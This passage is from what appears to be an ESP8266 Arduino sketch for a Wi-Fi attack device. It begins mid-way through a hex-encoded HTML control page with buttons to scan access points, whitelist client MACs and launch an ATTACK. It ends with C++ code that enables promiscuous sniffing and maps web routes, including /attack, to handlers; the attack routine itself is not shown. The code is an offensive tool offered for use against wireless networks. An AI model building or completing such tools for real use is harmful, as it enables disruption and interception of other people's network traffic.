,0x65,0x20,0x69,0x66,0x28,0x62,0x3d,0x3d,0x32,0x29,0x7b,0x20,0x76,0x61,0x72,0x20,0x72,0x65,0x63,0x76,0x3d,0x4a,0x53,0x4f,0x4e,0x2e,0x70,0x61,0x72,0x73,0x65,0x28,0x74,0x68,0x69,0x73,0x2e,0x72,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x54,0x65,0x78,0x74,0x29,0x3b,0x20,0x69,0x66,0x28,0x4f,0x62,0x6a,0x65,0x63,0x74,0x2e,0x6b,0x65,0x79,0x73,0x28,0x72,0x65,0x63,0x76,0x2e,0x77,0x63,0x6d,0x61,0x63,0x29,0x2e,0x6c,0x65,0x6e,0x67,0x74,0x68,0x3e,0x30,0x29,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x74,0x62,0x33,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x3d,0x22,0x3c,0x74,0x72,0x3e,0x3c,0x74,0x64,0x3e,0x53,0x4e,0x6f,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x43,0x6c,0x69,0x65,0x6e,0x74,0x20,0x4d,0x41,0x43,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x44,0x65,0x6c,0x65,0x74,0x65,0x20,0x4d,0x41,0x43,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x2f,0x74,0x72,0x3e,0x22,0x3b,0x20,0x66,0x6f,0x72,0x28,0x69,0x3d,0x30,0x3b,0x69,0x3c,0x4f,0x62,0x6a,0x65,0x63,0x74,0x2e,0x6b,0x65,0x79,0x73,0x28,0x72,0x65,0x63,0x76,0x2e,0x77,0x63,0x6d,0x61,0x63,0x29,0x2e,0x6c,0x65,0x6e,0x67,0x74,0x68,0x3b,0x69,0x2b,0x2b,0x29,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x74,0x62,0x33,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x2b,0x3d,0x22,0x3c,0x74,0x72,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x28,0x69,0x2b,0x31,0x29,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x22,0x2b,0x72,0x65,0x63,0x76,0x2e,0x77,0x63,0x6d,0x61,0x63,0x5b,0x69,0x5d,0x2b,0x22,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x3c,0x61,0x20,0x6f,0x6e,0x63,0x6c,0x69,0x63,0x6b,0x3d,0x78,0x68,0x72,0x28,0x5c,0x22,0x64,0x6c,0x77,0x3f,0x6e,0x75,0x6d,0x3d,0x22,0x2b,0x69,0x2b,0x22,0x5c,0x22,0x2c,0x5c,0x22,0x5c,0x22,0x2c,0x32,0x29,0x3e,0x64,0x65,0x6c,0x65,0x74,0x65,0x3c,0x2f,0x61,0x3e,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x2f,0x74,0x72,0x3e,0x22,0x3b,0x20,0x7d,0x65,0x6c,0x73,0x65,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x74,0x62,0x33,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x3d,0x22,0x22,0x3b,0x20,0x7d,0x20,0x7d,0x65,0x6c,0x73,0x65,0x20,0x69,0x66,0x28,0x62,0x3d,0x3d,0x33,0x29,0x7b,0x20,0x69,0x66,0x28,0x74,0x68,0x69,0x73,0x2e,0x72,0x65,0x73,0x70,0x6f,0x6e,0x73,0x65,0x54,0x65,0x78,0x74,0x3d,0x3d,0x22,0x30,0x22,0x29,0x7b,0x20,0x61,0x6c,0x65,0x72,0x74,0x28,0x22,0x41,0x74,0x74,0x61,0x63,0x6b,0x69,0x6e,0x67,0x2e,0x2e,0x2e,0x22,0x29,0x3b,0x20,0x7d,0x20,0x7d,0x20,0x7d,0x20,0x7d,0x3b,0x20,0x78,0x68,0x74,0x74,0x70,0x2e,0x6f,0x70,0x65,0x6e,0x28,0x22,0x47,0x45,0x54,0x22,0x2c,0x20,0x75,0x72,0x6c,0x2c,0x20,0x74,0x72,0x75,0x65,0x29,0x3b,0x20,0x78,0x68,0x74,0x74,0x70,0x2e,0x73,0x65,0x6e,0x64,0x28,0x29,0x3b,0x20,0x7d,0x20,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x73,0x63,0x61,0x6e,0x62,0x74,0x6e,0x28,0x29,0x7b,0x20,0x69,0x66,0x28,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x31,0x22,0x29,0x2e,0x6e,0x61,0x6d,0x65,0x3d,0x3d,0x22,0x62,0x74,0x6e,0x31,0x6e,0x22,0x29,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x31,0x22,0x29,0x2e,0x6e,0x61,0x6d,0x65,0x3d,0x22,0x62,0x74,0x6e,0x31,0x6e,0x64,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x64,0x69,0x76,0x33,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x64,0x69,0x73,0x70,0x6c,0x61,0x79,0x3d,0x22,0x6e,0x6f,0x6e,0x65,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x31,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x3d,0x22,0x53,0x43,0x41,0x4e,0x4e,0x49,0x4e,0x47,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x31,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x62,0x6f,0x72,0x64,0x65,0x72,0x3d,0x22,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x66,0x66,0x30,0x30,0x30,0x30,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x31,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x22,0x23,0x66,0x66,0x30,0x30,0x30,0x30,0x22,0x3b,0x20,0x78,0x68,0x72,0x28,0x22,0x61,0x70,0x73,0x63,0x61,0x6e,0x22,0x2c,0x22,0x62,0x74,0x6e,0x31,0x22,0x2c,0x30,0x29,0x3b,0x20,0x7d,0x20,0x7d,0x20,0x76,0x61,0x72,0x20,0x69,0x6e,0x74,0x72,0x76,0x6c,0x3b,0x20,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x63,0x73,0x63,0x61,0x6e,0x28,0x29,0x7b,0x20,0x69,0x66,0x28,0x63,0x73,0x74,0x72,0x74,0x3d,0x3d,0x66,0x61,0x6c,0x73,0x65,0x29,0x7b,0x20,0x63,0x73,0x74,0x72,0x74,0x3d,0x74,0x72,0x75,0x65,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x32,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x3d,0x22,0x43,0x4f,0x4e,0x54,0x49,0x4e,0x55,0x4f,0x55,0x53,0x20,0x53,0x43,0x41,0x4e,0x20,0x53,0x54,0x4f,0x50,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x32,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x62,0x6f,0x72,0x64,0x65,0x72,0x3d,0x22,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x66,0x66,0x30,0x30,0x30,0x30,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x32,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x22,0x23,0x66,0x66,0x30,0x30,0x30,0x30,0x22,0x3b,0x20,0x69,0x6e,0x74,0x72,0x76,0x6c,0x3d,0x73,0x65,0x74,0x49,0x6e,0x74,0x65,0x72,0x76,0x61,0x6c,0x28,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x28,0x29,0x7b,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x31,0x22,0x29,0x2e,0x63,0x6c,0x69,0x63,0x6b,0x28,0x29,0x3b,0x7d,0x2c,0x30,0x29,0x3b,0x20,0x7d,0x65,0x6c,0x73,0x65,0x7b,0x20,0x63,0x73,0x74,0x72,0x74,0x3d,0x66,0x61,0x6c,0x73,0x65,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x32,0x22,0x29,0x2e,0x69,0x6e,0x6e,0x65,0x72,0x48,0x54,0x4d,0x4c,0x3d,0x22,0x43,0x4f,0x4e,0x54,0x49,0x4e,0x55,0x4f,0x55,0x53,0x20,0x53,0x43,0x41,0x4e,0x20,0x53,0x54,0x41,0x52,0x54,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x32,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x62,0x6f,0x72,0x64,0x65,0x72,0x3d,0x22,0x31,0x70,0x78,0x20,0x73,0x6f,0x6c,0x69,0x64,0x20,0x23,0x30,0x30,0x66,0x66,0x30,0x30,0x22,0x3b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x62,0x74,0x6e,0x32,0x22,0x29,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x22,0x23,0x30,0x30,0x66,0x66,0x30,0x30,0x22,0x3b,0x20,0x63,0x6c,0x65,0x61,0x72,0x49,0x6e,0x74,0x65,0x72,0x76,0x61,0x6c,0x28,0x69,0x6e,0x74,0x72,0x76,0x6c,0x29,0x3b,0x20,0x7d,0x20,0x7d,0x20,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x6d,0x61,0x63,0x76,0x61,0x6c,0x69,0x64,0x61,0x74,0x69,0x6f,0x6e,0x28,0x6d,0x61,0x63,0x29,0x7b,0x20,0x69,0x66,0x28,0x6d,0x61,0x63,0x2e,0x6c,0x65,0x6e,0x67,0x74,0x68,0x3d,0x3d,0x31,0x32,0x29,0x7b,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x77,0x63,0x6d,0x61,0x63,0x22,0x29,0x2e,0x76,0x61,0x6c,0x75,0x65,0x3d,0x22,0x22,0x3b,0x20,0x76,0x61,0x72,0x20,0x66,0x6d,0x61,0x63,0x3d,0x6d,0x61,0x63,0x2e,0x73,0x75,0x62,0x73,0x74,0x72,0x28,0x30,0x2c,0x32,0x29,0x2b,0x22,0x3a,0x22,0x2b,0x6d,0x61,0x63,0x2e,0x73,0x75,0x62,0x73,0x74,0x72,0x28,0x32,0x2c,0x32,0x29,0x2b,0x22,0x3a,0x22,0x2b,0x6d,0x61,0x63,0x2e,0x73,0x75,0x62,0x73,0x74,0x72,0x28,0x34,0x2c,0x32,0x29,0x2b,0x22,0x3a,0x22,0x2b,0x6d,0x61,0x63,0x2e,0x73,0x75,0x62,0x73,0x74,0x72,0x28,0x36,0x2c,0x32,0x29,0x2b,0x22,0x3a,0x22,0x2b,0x6d,0x61,0x63,0x2e,0x73,0x75,0x62,0x73,0x74,0x72,0x28,0x38,0x2c,0x32,0x29,0x2b,0x22,0x3a,0x22,0x2b,0x6d,0x61,0x63,0x2e,0x73,0x75,0x62,0x73,0x74,0x72,0x28,0x31,0x30,0x2c,0x32,0x29,0x3b,0x20,0x78,0x68,0x72,0x28,0x22,0x61,0x64,0x77,0x3f,0x6d,0x61,0x63,0x3d,0x22,0x2b,0x66,0x6d,0x61,0x63,0x2c,0x22,0x22,0x2c,0x31,0x29,0x3b,0x20,0x7d,0x65,0x6c,0x73,0x65,0x7b,0x20,0x61,0x6c,0x65,0x72,0x74,0x28,0x22,0x49,0x6e,0x76,0x61,0x6c,0x69,0x64,0x20,0x4d,0x41,0x43,0x2c,0x20,0x46,0x6f,0x72,0x6d,0x61,0x74,0x20,0x73,0x68,0x6f,0x75,0x6c,0x64,0x20,0x62,0x65,0x20,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x22,0x29,0x3b,0x20,0x7d,0x20,0x7d,0x20,0x3c,0x2f,0x73,0x63,0x72,0x69,0x70,0x74,0x3e,0x20,0x3c,0x2f,0x68,0x65,0x61,0x64,0x3e,0x20,0x3c,0x62,0x6f,0x64,0x79,0x20,0x62,0x67,0x63,0x6f,0x6c,0x6f,0x72,0x3d,0x22,0x23,0x30,0x30,0x30,0x30,0x30,0x30,0x22,0x3e,0x20,0x3c,0x64,0x69,0x76,0x20,0x69,0x64,0x3d,0x22,0x64,0x69,0x76,0x31,0x22,0x3e,0x20,0x3c,0x73,0x70,0x61,0x6e,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x66,0x6f,0x6e,0x74,0x2d,0x73,0x69,0x7a,0x65,0x3a,0x32,0x30,0x70,0x78,0x22,0x3e,0x3c,0x75,0x3e,0x53,0x63,0x61,0x6e,0x3c,0x2f,0x75,0x3e,0x20,0x3c,0x75,0x3e,0x66,0x6f,0x72,0x3c,0x2f,0x75,0x3e,0x20,0x3c,0x75,0x3e,0x57,0x69,0x46,0x69,0x3c,0x2f,0x75,0x3e,0x20,0x3c,0x75,0x3e,0x41,0x63,0x63,0x65,0x73,0x73,0x3c,0x2f,0x75,0x3e,0x20,0x3c,0x75,0x3e,0x50,0x6f,0x69,0x6e,0x74,0x3c,0x2f,0x75,0x3e,0x3c,0x2f,0x73,0x70,0x61,0x6e,0x3e,0x3c,0x62,0x72,0x3e,0x3c,0x62,0x72,0x3e,0x20,0x3c,0x62,0x75,0x74,0x74,0x6f,0x6e,0x20,0x69,0x64,0x3d,0x22,0x62,0x74,0x6e,0x31,0x22,0x20,0x6f,0x6e,0x63,0x6c,0x69,0x63,0x6b,0x3d,0x22,0x73,0x63,0x61,0x6e,0x62,0x74,0x6e,0x28,0x29,0x22,0x20,0x6e,0x61,0x6d,0x65,0x3d,0x22,0x62,0x74,0x6e,0x31,0x6e,0x22,0x3e,0x53,0x43,0x41,0x4e,0x3c,0x2f,0x62,0x75,0x74,0x74,0x6f,0x6e,0x3e,0x3c,0x62,0x72,0x3e,0x3c,0x62,0x72,0x3e,0x3c,0x62,0x75,0x74,0x74,0x6f,0x6e,0x20,0x69,0x64,0x3d,0x22,0x62,0x74,0x6e,0x32,0x22,0x20,0x6f,0x6e,0x63,0x6c,0x69,0x63,0x6b,0x3d,0x22,0x63,0x73,0x63,0x61,0x6e,0x28,0x29,0x22,0x3e,0x43,0x4f,0x4e,0x54,0x49,0x4e,0x55,0x4f,0x55,0x53,0x20,0x53,0x43,0x41,0x4e,0x20,0x53,0x54,0x41,0x52,0x54,0x3c,0x2f,0x62,0x75,0x74,0x74,0x6f,0x6e,0x3e,0x3c,0x62,0x72,0x3e,0x3c,0x62,0x72,0x3e,0x20,0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x69,0x64,0x3d,0x22,0x74,0x62,0x31,0x22,0x3e,0x20,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x3c,0x62,0x72,0x3e,0x20,0x3c,0x70,0x3e,0x57,0x50,0x41,0x2a,0x20,0x3d,0x20,0x57,0x50,0x41,0x2f,0x57,0x50,0x41,0x32,0x20,0x61,0x75,0x74,0x6f,0x20,0x6d,0x6f,0x64,0x65,0x3c,0x2f,0x70,0x3e,0x20,0x3c,0x2f,0x64,0x69,0x76,0x3e,0x20,0x3c,0x64,0x69,0x76,0x20,0x69,0x64,0x3d,0x22,0x64,0x69,0x76,0x32,0x22,0x3e,0x20,0x3c,0x73,0x70,0x61,0x6e,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x66,0x6f,0x6e,0x74,0x2d,0x73,0x69,0x7a,0x65,0x3a,0x32,0x30,0x70,0x78,0x22,0x3e,0x3c,0x75,0x3e,0x57,0x68,0x69,0x74,0x65,0x6c,0x69,0x73,0x74,0x3c,0x2f,0x75,0x3e,0x20,0x3c,0x75,0x3e,0x66,0x6f,0x72,0x3c,0x2f,0x75,0x3e,0x20,0x3c,0x75,0x3e,0x43,0x6c,0x69,0x65,0x6e,0x74,0x73,0x3c,0x2f,0x75,0x3e,0x3c,0x2f,0x73,0x70,0x61,0x6e,0x3e,0x3c,0x62,0x72,0x3e,0x3c,0x62,0x72,0x3e,0x20,0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x69,0x64,0x3d,0x22,0x74,0x62,0x32,0x22,0x3e,0x3c,0x74,0x72,0x3e,0x3c,0x74,0x64,0x3e,0x43,0x6c,0x69,0x65,0x6e,0x74,0x20,0x4d,0x41,0x43,0x20,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x3c,0x69,0x6e,0x70,0x75,0x74,0x20,0x74,0x79,0x70,0x65,0x3d,0x22,0x74,0x65,0x78,0x74,0x22,0x20,0x69,0x64,0x3d,0x22,0x77,0x63,0x6d,0x61,0x63,0x22,0x20,0x6f,0x6e,0x62,0x6c,0x75,0x72,0x3d,0x22,0x74,0x68,0x69,0x73,0x2e,0x76,0x61,0x6c,0x75,0x65,0x3d,0x74,0x68,0x69,0x73,0x2e,0x76,0x61,0x6c,0x75,0x65,0x2e,0x74,0x6f,0x55,0x70,0x70,0x65,0x72,0x43,0x61,0x73,0x65,0x28,0x29,0x22,0x20,0x70,0x6c,0x61,0x63,0x65,0x68,0x6f,0x6c,0x64,0x65,0x72,0x3d,0x22,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x78,0x22,0x3e,0x3c,0x2f,0x74,0x64,0x3e,0x3c,0x74,0x64,0x3e,0x3c,0x62,0x75,0x74,0x74,0x6f,0x6e,0x20,0x6f,0x6e,0x63,0x6c,0x69,0x63,0x6b,0x3d,0x6d,0x61,0x63,0x76,0x61,0x6c,0x69,0x64,0x61,0x74,0x69,0x6f,0x6e,0x28,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x22,0x77,0x63,0x6d,0x61,0x63,0x22,0x29,0x2e,0x76,0x61,0x6c,0x75,0x65,0x29,0x3e,0x41,0x44,0x44,0x3c,0x2f,0x62,0x75,0x74,0x74,0x6f,0x6e,0x3e,0x3c,0x2f,0x74,0x64,0x3c,0x2f,0x74,0x72,0x3e,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x20,0x3c,0x62,0x72,0x3e,0x3c,0x62,0x72,0x3e,0x20,0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x69,0x64,0x3d,0x22,0x74,0x62,0x33,0x22,0x3e,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x3c,0x62,0x72,0x3e,0x20,0x3c,0x2f,0x64,0x69,0x76,0x3e,0x3c,0x62,0x72,0x3e,0x20,0x3c,0x64,0x69,0x76,0x20,0x69,0x64,0x3d,0x22,0x64,0x69,0x76,0x33,0x22,0x3e,0x20,0x3c,0x63,0x65,0x6e,0x74,0x65,0x72,0x3e,0x3c,0x62,0x75,0x74,0x74,0x6f,0x6e,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x6d,0x61,0x72,0x67,0x69,0x6e,0x2d,0x6c,0x65,0x66,0x74,0x3a,0x31,0x37,0x70,0x78,0x22,0x20,0x6f,0x6e,0x63,0x6c,0x69,0x63,0x6b,0x3d,0x78,0x68,0x72,0x28,0x22,0x61,0x74,0x74,0x61,0x63,0x6b,0x22,0x2c,0x22,0x22,0x2c,0x33,0x29,0x3e,0x41,0x54,0x54,0x41,0x43,0x4b,0x3c,0x2f,0x62,0x75,0x74,0x74,0x6f,0x6e,0x3e,0x3c,0x2f,0x63,0x65,0x6e,0x74,0x65,0x72,0x3e,0x20,0x3c,0x2f,0x64,0x69,0x76,0x33,0x3e,0x20,0x3c,0x73,0x63,0x72,0x69,0x70,0x74,0x3e,0x20,0x78,0x68,0x72,0x28,0x22,0x77,0x63,0x6c,0x69,0x22,0x2c,0x22,0x22,0x2c,0x32,0x29,0x3b,0x20,0x3c,0x2f,0x73,0x63,0x72,0x69,0x70,0x74,0x3e,0x20,0x3c,0x2f,0x62,0x6f,0x64,0x79,0x3e,0x20,0x3c,0x2f,0x68,0x74,0x6d,0x6c,0x3e,0x20};

char* html(){
  int _size = sizeof(indexhtml);
  for(int i=0;i<sizeof(htmlbuf);i++){
    if(i<_size)
      htmlbuf[i] = pgm_read_byte_near(indexhtml + i);
    else 
      htmlbuf[i] = 0x00;
  }
  return htmlbuf;
}

void root(){
  server.send(200,"text/html",html());
}

void setup() {
  Serial.begin(115200);
  delay(2000);
  wifi_set_promiscuous_rx_cb(sniffer); //Set up promiscuous callback 
  startWifi();
  
  server.onNotFound([](){server.send(404,"text/html","Not Found");});
  server.on("/",root);
  
  server.on("/apscan",apscan);
  server.on("/apsel",apsel);
  
  server.on("/adw",adw);
  server.on("/dlw",dlw);
  server.on("/wcli",wcli);
  
  server.on("/attack",sniff);

  
  server.begin();
}

void loop() {
  if(!sniffing)
    server.handleClient();
}
